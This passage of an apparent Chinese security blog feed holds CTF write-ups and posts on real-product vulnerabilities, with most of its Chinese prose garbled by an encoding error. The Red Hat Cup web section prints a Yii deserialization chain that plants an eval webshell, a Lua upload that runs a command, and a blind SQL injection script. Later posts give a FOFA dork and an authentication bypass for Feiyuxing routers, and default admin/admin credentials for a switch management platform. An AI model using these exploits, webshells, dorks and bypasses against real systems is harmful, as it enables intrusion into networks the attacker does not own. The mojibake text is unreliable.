class="string">&#x27;flag.png&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h2><p>å‘é€ä¸ªgetè¯·æ±‚ï¼ˆ<code>//?code=&lt;?=phpinfo();?&gt;</code>ï¼‰ï¼Œç„¶åè®¿é—®hack.phpå³å¯å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210509114407282.png"></p><h2 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h2><p>ååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;file_put_contents(&quot;php://filter/write=convert.base64-decode/resource=/var/www/html/web/assets/5118a5d1/fonts/b.php&quot;,&quot;PD9waHAgZXZhbCgkX0dFVFthXSk7Pz4K&quot;)&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;modelClass=<span class="string">&#x27;DynamicModel&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;scenario=<span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#http://eci-2zeab1jn4vnk38xn572o.cloudeci1.ichunqiu.com/index.php?r=site%2Fabout&amp;message=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6NDp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NjoiYXNzZXJ0IjtzOjI6ImlkIjtzOjE1MToiZmlsZV9wdXRfY29udGVudHMoInBocDovL2ZpbHRlci93cml0ZT1jb252ZXJ0LmJhc2U2NC1kZWNvZGUvcmVzb3VyY2U9L3Zhci93d3cvaHRtbC93ZWIvYXNzZXRzLzUxMThhNWQxL2ZvbnRzL2IucGhwIiwiUEQ5d2FIQWdaWFpoYkNna1gwZEZWRnRoWFNrN1B6NEsiKSI7czoxMDoibW9kZWxDbGFzcyI7czoxMjoiRHluYW1pY01vZGVsIjtzOjg6InNjZW5hcmlvIjtzOjM6IjExMSI7fWk6MTtzOjM6InJ1biI7fX19fQ==</span></span><br></pre></td></tr></table></figure><p>æ¥ç€æ„é€ payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2zeab1jn4vnk38xn572o.cloudeci1.ichunqiu.com&#x2F;assets&#x2F;5118a5d1&#x2F;fonts&#x2F;harvey.php?a&#x3D;eval($_POST[harvey]); </span><br></pre></td></tr></table></figure><p>ç„¶åèšå‰‘æˆåŠŸè¿æ¥ï¼Œå‘ç°uaç»•è¿‡ä¿æŠ¤æ‰§è¡Œå‘½ä»¤ï¼Œå‚è€ƒè¥¿æ¹–è®ºå‰‘_web1.docxï¼›</p><p>äºæ˜¯æˆ‘ä»¬åˆ†åˆ«ä¸Šä¼  <strong>.htaccess</strong> å’Œ <strong>3.lua</strong> è¿™ä¸¤ä¸ªæ–‡ä»¶</p><center>.htaccess</center><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler lua-script .lua</span><br></pre></td></tr></table></figure><center>3.lua</center><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">require &quot;string&quot;</span><br><span class="line"></span><br><span class="line">--[[</span><br><span class="line">     This is the default method name for Lua handlers, see the optional</span><br><span class="line">     function-name in the LuaMapHandler directive to choose a different</span><br><span class="line">     entry point.</span><br><span class="line">--]]</span><br><span class="line">function handle(r)</span><br><span class="line">    r.content_type &#x3D; &quot;text&#x2F;plain&quot;</span><br><span class="line">    r:puts(&quot;Hello Lua World!\n&quot;)</span><br><span class="line">    local t &#x3D; io.popen(&#39;&#x2F;readflag&#39;)</span><br><span class="line">    local a &#x3D; t:read(&quot;*all&quot;)</span><br><span class="line">    r:puts(a)</span><br><span class="line">    if r.method &#x3D;&#x3D; &#39;GET&#39; then</span><br><span class="line">        for k, v in pairs( r:parseargs() ) do</span><br><span class="line">            r:puts( string.format(&quot;%s: %s\n&quot;, k, v) )</span><br><span class="line">        end</span><br><span class="line">    else</span><br><span class="line">        r:puts(&quot;Unsupported HTTP method &quot; .. r.method)</span><br><span class="line">    end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>æœ€åå»è®¿é—® <strong>3.lua</strong> å³å¯å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202105098741998154565.png"></p><h2 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h2><p>sqlç›²æ³¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://eci-2zeg1tmyhxfbqrmxi9m1.cloudeci1.ichunqiu.com/image.php?id=3&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;^((ascii(substr((select(group_concat(password))from(users)),&#123;&#125;,1)))=&#123;&#125;)&#x27;</span></span><br><span class="line">s=<span class="string">&#x27;1234567890abcdef&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> s:</span><br><span class="line">        payloads=payload.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(b))</span><br><span class="line">        a=requests.get(url+payloads)</span><br><span class="line">        <span class="comment">#print(url+payloads)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a.text)&lt;<span class="number">19000</span>:</span><br><span class="line">            print(b)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>è·‘ä¸‹è„šæœ¬å¾—åˆ°å¯†ç ï¼šdd6005ef9c77d5ae820baï¼›è¿›è€ŒæˆåŠŸç™»å½•</p><p>ç„¶åssrfï¼Œfile:///flagå¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202105091656403626.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202105092165628417.png"></p><h1 id="Cryptoï¼ˆåŸé¢˜ï¼‰"><a href="#Cryptoï¼ˆåŸé¢˜ï¼‰" class="headerlink" title="Cryptoï¼ˆåŸé¢˜ï¼‰"></a>Cryptoï¼ˆåŸé¢˜ï¼‰</h1><h2 id="primegame"><a href="#primegame" class="headerlink" title="primegame"></a>primegame</h2><p><a href="https://pan.baidu.com/s/1wPMpbhQ7NmFivQzZ1cpBzQ"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šrlgcï¼‰</p><p>æºè‡ªBaby Bubmiçš„wpï¼š<a href="http://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/">http://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/</a></p><p>é™„ä¸Šè„šæœ¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">import math</span><br><span class="line">from decimal import *</span><br><span class="line">import random</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">getcontext().prec &#x3D; int(100)</span><br><span class="line"></span><br><span class="line">primes &#x3D; [2]</span><br><span class="line">for i in range(3, 100):</span><br><span class="line">    f &#x3D; True</span><br><span class="line">    for j in primes:</span><br><span class="line">        if i * i &lt; j:</span><br><span class="line">            break</span><br><span class="line">        if i % j &#x3D;&#x3D; 0:</span><br><span class="line">            f &#x3D; False</span><br><span class="line">            break</span><br><span class="line">    if f:</span><br><span class="line">        primes.append(i)</span><br><span class="line"></span><br><span class="line">keys &#x3D; []</span><br><span class="line">for i in range(len(primes)):</span><br><span class="line">    keys.append(Decimal(int(primes[i])).ln())</span><br><span class="line"></span><br><span class="line">arr &#x3D; []</span><br><span class="line">for v in keys:</span><br><span class="line">    arr.append(int(v * int(16) ** int(64)))</span><br><span class="line"></span><br><span class="line">ct &#x3D; 597952043660446249020184773232983974017780255881942379044454676980646417087515453</span><br><span class="line"></span><br><span class="line">def encrypt(res):</span><br><span class="line">    h &#x3D; Decimal(int(0))</span><br><span class="line">    for i in range(len(keys)):</span><br><span class="line">        h +&#x3D; res[i] * keys[i]</span><br><span class="line"></span><br><span class="line">    ct &#x3D; int(h * int(16)**int(64))</span><br><span class="line">    return ct</span><br><span class="line"></span><br><span class="line">def f(N):</span><br><span class="line">    ln &#x3D; len(arr)</span><br><span class="line">    A &#x3D; Matrix(ZZ, ln + 1, ln + 1)</span><br><span class="line">    for i in range(ln):</span><br><span class="line">        A[i, i] &#x3D; 1</span><br><span class="line">        A[i, ln] &#x3D; arr[i] &#x2F;&#x2F; N</span><br><span class="line">        A[ln, i] &#x3D; 64</span><br><span class="line"></span><br><span class="line">    A[ln, ln] &#x3D; ct &#x2F;&#x2F; N</span><br><span class="line"></span><br><span class="line">    res &#x3D; A.LLL()</span><br><span class="line"></span><br><span class="line">    for i in range(ln + 1):</span><br><span class="line">        flag &#x3D; True</span><br><span class="line">        for j in range(ln):</span><br><span class="line">            if -64 &lt;&#x3D; res[i][j] &lt; 64:</span><br><span class="line">                continue</span><br><span class="line">            flag &#x3D; False</span><br><span class="line">            break</span><br><span class="line">        if flag:</span><br><span class="line">            vec &#x3D; [int(v + 64) for v in res[i][:-1]]</span><br><span class="line">            ret &#x3D; encrypt(vec)</span><br><span class="line">            if ret &#x3D;&#x3D; ct:</span><br><span class="line">                print(N, bytes(vec))</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;NO&quot;, ret, bytes(vec))</span><br><span class="line"></span><br><span class="line">for i in range(2, 10000):</span><br><span class="line">    print(i)</span><br><span class="line">    f(i)</span><br></pre></td></tr></table></figure><h2 id="hpcurve"><a href="#hpcurve" class="headerlink" title="hpcurve"></a>hpcurve</h2><p><a href="https://pan.baidu.com/s/1k0GrX5-GDkilnECN0Q2y0Q"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼š97jsï¼‰</p><p>æºè‡ª hxpCTF2020 çš„ hyper çš„å®˜æ–¹wpï¼š<a href="https://jsur.in/posts/2020-12-21-hxp-ctf-2020-hyper-writeup">https://jsur.in/posts/2020-12-21-hxp-ctf-2020-hyper-writeup</a></p><p>é™„ä¸Šè„šæœ¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">p &#x3D; 10000000000000001119</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; &#x3D; GF(p)[]; y&#x3D;x</span><br><span class="line">f &#x3D; y + prod(map(eval, &#39;yyyyyyy&#39;))</span><br><span class="line">C &#x3D; HyperellipticCurve(f, 0)</span><br><span class="line">J &#x3D; C.jacobian()</span><br><span class="line">Ds &#x3D; [J(C(x, min(f(x).sqrt(0,1)))) for x in (11,22,33)]</span><br><span class="line"></span><br><span class="line">enc &#x3D; bytes.fromhex(&#39;66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5&#39;)</span><br><span class="line">known_pt &#x3D; b&quot;a&quot;*20 + b&quot;flag&quot;</span><br><span class="line"></span><br><span class="line">rng_output &#x3D; bytes(e^^m for e,m in zip(enc, known_pt))</span><br><span class="line"></span><br><span class="line">blocks &#x3D; [rng_output[i:i+8] for i in range(0, len(rng_output), 8)]</span><br><span class="line">ui &#x3D; [int.from_bytes(r, &#39;little&#39;) for r in blocks]</span><br><span class="line">u &#x3D; x^3 + ui[2]*x^2 + ui[1]*x + ui[0]</span><br><span class="line"></span><br><span class="line">L &#x3D; GF(p).algebraic_closure()</span><br><span class="line">roots &#x3D; [r[0] for r in u.change_ring(L).roots()]</span><br><span class="line"></span><br><span class="line">RR.&lt;zz&gt; &#x3D; PolynomialRing(L)</span><br><span class="line">v &#x3D; RR.lagrange_polynomial([(xi, f(xi).sqrt()) for xi in roots])</span><br><span class="line">vi &#x3D; [v.coefficients()[i].as_finite_field_element()[1] for i in range(3)]</span><br><span class="line">vi &#x3D; [(int(-c), int(c)) for c in vi]</span><br><span class="line"></span><br><span class="line">for rs in itertools.product(*vi):</span><br><span class="line">    q &#x3D; struct.pack(&#39;&lt;&#39;+&#39;Q&#39;*len(rs), *rs)</span><br><span class="line"></span><br><span class="line">    flag &#x3D; bytes(k^^m for k,m in zip(2*(rng_output+q), enc))</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> çº¢å¸½æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬äº”å±Šâ€œè“å¸½æ¯â€å…¨å›½å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›</title>
      <link href="2021/04/29/2021bluecat/"/>
      <url>2021/04/29/2021bluecat/</url>
      
        <content type="html"><![CDATA[<blockquote><p>è“å¸½æ¯ â€”â€” ä¸€åœºç¬¬ä¸€æ¬¡ä¸æƒ³è¿›çº¿ä¸‹çš„CTFï¼ˆå…¨æ˜¯å–è¯ä¿ºä¸ä¼š.GIF</p></blockquote><h2 id="Ball-sigin"><a href="#Ball-sigin" class="headerlink" title="Ball_sigin"></a>Ball_sigin</h2><blockquote><p>æ»‘é›ªä¹Ÿèƒ½ç©å‡ºæ–°èŠ±æ ·ï¼Ÿ</p></blockquote><p>æˆ‘è¿˜æ˜¯è€è€å®å®æ‰“æ¸¸æˆå¾—flagâ‘§</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021042988745971.png"></p><p>åŸæ¥æ”¹JSä¹Ÿè¡Œè€¶ï¼ˆtreeBg.x = 1;  æŠŠæ ‘çš„éšæœºç”Ÿæˆæ”¹æ‰å°±èƒ½è®©ä»–ç«™åˆ°ä¸€æ—</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210429204414.png"></p><h2 id="å†¬å¥¥ä¼š-is-coming"><a href="#å†¬å¥¥ä¼š-is-coming" class="headerlink" title="å†¬å¥¥ä¼š_is_coming"></a>å†¬å¥¥ä¼š_is_coming</h2><blockquote><p>å†°å¢©å¢©çœŸå¯çˆ±ï¼</p><p><a href="https://pan.baidu.com/s/1xkQ8eP94lE4tFBPuslkHoA">é™„ä»¶</a>ï¼ˆæå–ç ï¼šlje3ï¼‰</p></blockquote><p>è§£å‹å‡ºæ¥ä¸€å¼ å›¾ç‰‡ï¼Œç›´æ¥ä¸Šæ¥å°±æ˜¯ä¸€å¥—binwalk+foremostä¸è®²æ­¦å¾·å¥—é¤å¾—åˆ°ä¸€ä¸ªéŸ³é¢‘çš„åŒ…ï¼Œcatä¸€ä¸‹å‘ç°ä¸€ä¸²ç–‘ä¼¼emoji-aesçš„è¡¨æƒ…</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021042999875124.png"></p><p>è¿™é‡Œæˆ‘ä»¬æ ¹æ®æç¤ºå…«ä½æ•°å­—å†åŠ ä¸Šé¢˜ç›®å†¬å¥¥ä¼šæƒ³åˆ°åº”è¯¥æ˜¯å†¬å¥¥ä¼šå¼€å§‹çš„æ—¶é—´20220204ï¼Œäºæ˜¯ä¹æˆ‘ä»¬é€šè¿‡mp3stegoå»è§£å¯†</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210429148543.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021042941414445.png"></p><p>æ¥ç€æˆ‘ä»¬å»æ‰\xå’Œç©ºæ ¼æ‹¿å»hexè§£å¯†å¾—åˆ°ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021042987456.png"></p><p>å‘ç°æ˜¯<a href="https://www.dcode.fr/wingdings-font"><strong>wingdingå­—ç¬¦</strong></a>ï¼Œè§£ç å¾—åˆ°å…³é”®ä¿¡æ¯ï¼šAï¸Gï¸iï¸tï¸Hï¸uï¸bï¸rï¸eï¸poï¸sï¸iï¸tï¸oï¸rï¸yï¸nï¸aï¸mï¸eï¸dï¸1ï¸cï¸eï¸Pï¸eï¸aï¸kiï¸sï¸vï¸eï¸rï¸yï¸iï¸nï¸tï¸eï¸rï¸eï¸sï¸tï¸iï¸nï¸gï¸.ï¸Wï¸hï¸yï¸nï¸oï¸tï¸tï¸aï¸keï¸aï¸lï¸oï¸oï¸kaï¸tï¸iï¸tï¸?ï¸</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021042956214471561465.png"></p><p>äºæ˜¯æˆ‘ä»¬ä¸ŠGitHubæœç´¢å¾—åˆ°å¯†é’¥ï¼šHow_6ad_c0uld_a_1cePeak_be?</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210429654123456.png"></p><p>æœ€å<a href="https://aghorler.github.io/emoji-aes/"><strong>emoji-aes</strong></a>è§£å¯†å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202104291054664250.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è“å¸½æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é£é±¼æ˜Ÿè·¯ç”±å™¨0day</title>
      <link href="2021/04/20/feiyuxing/"/>
      <url>2021/04/20/feiyuxing/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ä¸€æ—¦æœ‰äº†æ¬²æœ›ï¼Œå°±ä¼šä¸€å‘ä¸å¯æ”¶æ‹¾</p></blockquote><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‚è€ƒè‡ªJ0J0å’Œä½©çªå¸ˆå‚…</p><p>é£é±¼æ˜Ÿä¼ä¸šçº§æ™ºèƒ½æ— çº¿ä¸Šç½‘è¡Œä¸ºç®¡ç†ç³»ç»Ÿä»¥åŠä¼—å¤šäº§å“å­˜åœ¨æƒé™ç»•è¿‡æ¼æ´</p><p>æ¼æ´åˆ†ç±»ï¼šé€»è¾‘æ¼æ´<br>å½±å“ç‰ˆæœ¬ï¼šå…¨ç‰ˆæœ¬</p><h2 id="æ“ä½œè¿‡ç¨‹"><a href="#æ“ä½œè¿‡ç¨‹" class="headerlink" title="æ“ä½œè¿‡ç¨‹"></a>æ“ä½œè¿‡ç¨‹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fofaè¯­æ³•ï¼štitle&#x3D;&quot;é£é±¼æ˜Ÿ&quot;</span><br></pre></td></tr></table></figure><p>â‘ .æ™ºèƒ½æ— çº¿ä¸Šç½‘è¡Œä¸ºç®¡ç†ç³»ç»Ÿ</p><p>ç›´æ¥æƒé™ç»•è¿‡ï¼Œè®¿é—® index.html æˆ–è€… home/index.html æŠ“åŒ…ï¼Œä¸¢æ‰cookie.cgiå°±è¡Œäº†ï¼ˆæˆ‘è¿™é‡Œæ˜¯å…¨ä¸¢æ‰ç„¶åå†åœæ­¢æŠ“åŒ…</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041911886.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041922886.png"></p><p>è€Œæƒ³è¦é£Ÿç”¨å…¶ä»–åŠŸèƒ½æ—¶ï¼Œéœ€è¦å†æ¬¡è¯·æ±‚ cookie.cgi ï¼Œä¸¢æ‰ cookie.cgi å¹¶æ”¾è¿‡å…¶ä»–åŒ…</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041933886.png"></p><p>â‘¡.æ™ºèƒ½ä¸Šç½‘ç®¡ç†è¡Œä¸ºç³»ç»Ÿ</p><p>é£Ÿç”¨æ–¹æ³•å’Œä¸Šé¢çš„å°±æ²¡å·®.jpg</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041941953625.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210419456214886.png"></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ç½‘å«å£«äº¤æ¢æœºé›†ä¸­ç®¡ç†å¹³å°é»˜è®¤å¼±å£ä»¤</title>
      <link href="2021/04/19/WenwangGuardian/"/>
      <url>2021/04/19/WenwangGuardian/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å½“ä½ å¾—åˆ°äº†èƒ½å†³å®šäººç”Ÿæ­»çš„ä¸œè¥¿ï¼Œå¿ƒä¸­çš„æ­£ä¹‰è¿˜ä¸ä¼šå˜å—ï¼Ÿ</p></blockquote><h2 id="å‰è¨€ï¼ˆèµ·åˆæ˜¯J0J0å¸ˆå‚…å‘ç°çš„"><a href="#å‰è¨€ï¼ˆèµ·åˆæ˜¯J0J0å¸ˆå‚…å‘ç°çš„" class="headerlink" title="å‰è¨€ï¼ˆèµ·åˆæ˜¯J0J0å¸ˆå‚…å‘ç°çš„"></a>å‰è¨€ï¼ˆèµ·åˆæ˜¯J0J0å¸ˆå‚…å‘ç°çš„</h2><p>æ¼æ´åç§°ï¼šæ–‡ç½‘å«å£«äº¤æ¢æœºé›†ä¸­ç®¡ç†å¹³å°é»˜è®¤å¼±å£ä»¤</p><p>æ¼æ´ç±»å‹ï¼šå¼±å£ä»¤</p><p>æ¼æ´èŒƒå›´ï¼šè¾ƒå¤§</p><h2 id="æ“ä½œè¿‡ç¨‹"><a href="#æ“ä½œè¿‡ç¨‹" class="headerlink" title="æ“ä½œè¿‡ç¨‹"></a>æ“ä½œè¿‡ç¨‹</h2><p>å¼±å£ä»¤ yyds</p><p>è´¦æˆ·å¯†ç ï¼šadmin/admin</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041974185675.png"></p><h2 id="æ•ˆæœå›¾"><a href="#æ•ˆæœå›¾" class="headerlink" title="æ•ˆæœå›¾"></a>æ•ˆæœå›¾</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021041974185858558.png"></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
